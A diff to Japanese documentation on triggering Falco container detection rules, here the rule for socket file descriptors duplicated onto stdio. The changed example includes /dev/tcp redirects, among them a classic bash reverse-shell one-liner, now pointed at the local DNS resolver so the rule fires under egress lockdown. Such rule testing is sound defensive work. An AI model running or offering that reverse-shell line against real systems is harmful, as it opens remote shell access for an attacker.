@@ -145,11 +145,13 @@ cp /bin/sleep /tmp/x && /tmp/x 1    # ← 発火 (/tmp/x は upper layer)
 
 実 condition (抜粋): `dup and container and evt.rawres in (0,1,2) and fd.type in ("ipv4","ipv6") and not user_known_stand_streams_redirect_activities`
 
-例:
+例 (egress lockdown 環境では宛先を常に許可済みの DNS リゾルバにすること —
+8.8.8.8 等の外部宛先は接続が silently drop され dup2 に到達しない = 発火しない):
 ```bash
-bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'   # ← 発火 (dup2 of socket fd to fd 1)
-bash -i >& /dev/tcp/host/port 0>&1       # ← 古典 reverse shell — 発火
-curl https://example.com -o /tmp/x       # ← 普通の HTTP — 発火しない
+DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf)
+bash -c "exec 1<>/dev/tcp/$DNS/53"       # ← 発火 (dup2 of socket fd to fd 1)
+bash -i >& /dev/tcp/$DNS/53 0>&1         # ← 古典 reverse shell — 発火
+curl https://example.com -o /tmp/x       # ← 普通の HTTP — 発火しない (egress lockdown 下では到達もしない)
 ```
 
 ### 3.7 `Create Hardlink Over Sensitive Files` / `Create Symlink Over Sensitive Files`
